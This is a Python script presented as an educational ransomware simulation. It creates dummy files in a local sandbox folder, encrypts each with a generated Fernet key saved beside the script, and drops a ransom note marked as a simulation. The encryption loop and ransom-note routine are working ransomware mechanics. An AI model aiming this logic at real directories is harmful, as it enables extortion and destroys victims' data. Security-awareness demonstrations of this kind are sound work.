import uuid
from pathlib import Path
from cryptography.fernet import Fernet

SCRIPT_DIR = Path(__file__).parent.resolve()
SANDBOX_DIR = SCRIPT_DIR / "test_files"
KEY_FILE = SCRIPT_DIR / "ransom.key"
RANSOM_NOTE = "README_RANSOM.txt"

DUMMY_FILES = {
    "document1.txt": "This is a confidential document.\nIt contains sensitive business information.",
    "notes.txt": "Meeting notes from 2026-04-01:\n- Project deadline extended\n- Budget approved",
    "report.csv": "name,value,date\nalpha,100,2026-01-01\nbeta,200,2026-01-02\ngamma,300,2026-01-03",
    "todo.txt": "1. Finish quarterly report\n2. Review pull requests\n3. Update documentation",
}

RANSOM_NOTE_TEXT = """\
!!! YOUR FILES HAVE BEEN ENCRYPTED !!!

All files in this directory have been encrypted with AES-128 encryption.
You cannot access your files without the decryption key.

[THIS IS A SIMULATION - No real ransom is being demanded]
[This script exists for educational/security awareness purposes only]

In a real attack, payment instructions (cryptocurrency wallet, deadline, etc.)
would appear here. Victims are typically given 48-72 hours before the key
is permanently deleted.

Your unique victim ID: {uid}
"""


def create_sandbox():
    SANDBOX_DIR.mkdir(exist_ok=True)
    for filename, content in DUMMY_FILES.items():
        filepath = SANDBOX_DIR / filename
        if not filepath.exists():
            filepath.write_text(content, encoding="utf-8")
    print(f"[*] Sandbox ready: {SANDBOX_DIR}")


def encrypt_files():
    key = Fernet.generate_key()
    KEY_FILE.write_bytes(key)
    print(f"[*] Key saved to: {KEY_FILE.name}  (in a real attack this is sent to the attacker)")

    fernet = Fernet(key)
    count = 0

    for filepath in SANDBOX_DIR.iterdir():
        if filepath.name == RANSOM_NOTE or not filepath.is_file():
            continue
        filepath.write_bytes(fernet.encrypt(filepath.read_bytes()))
        print(f"[+] Encrypted: {filepath.name}")
        count += 1

    return count


def drop_ransom_note():
    uid = str(uuid.uuid4()).upper()[:16]
    (SANDBOX_DIR / RANSOM_NOTE).write_text(
        RANSOM_NOTE_TEXT.format(uid=uid), encoding="utf-8"
    )
    print(f"[*] Ransom note dropped: {RANSOM_NOTE}")


def main():
    print("=" * 52)
    print("   RANSOMWARE SIMULATION  —  EDUCATIONAL ONLY")
    print("=" * 52)

    print("\n[Phase 1] Creating sandbox with dummy victim files...")
    create_sandbox()

    print("\n[Phase 2] Encrypting files...")
    count = encrypt_files()

    print("\n[Phase 3] Dropping ransom note...")
    drop_ransom_note()

    print(f"\n[!] Done. {count} file(s) encrypted.")
    print(f"[!] Run Decrypt.py to restore them using '{KEY_FILE.name}'.")


if __name__ == "__main__":
    main()
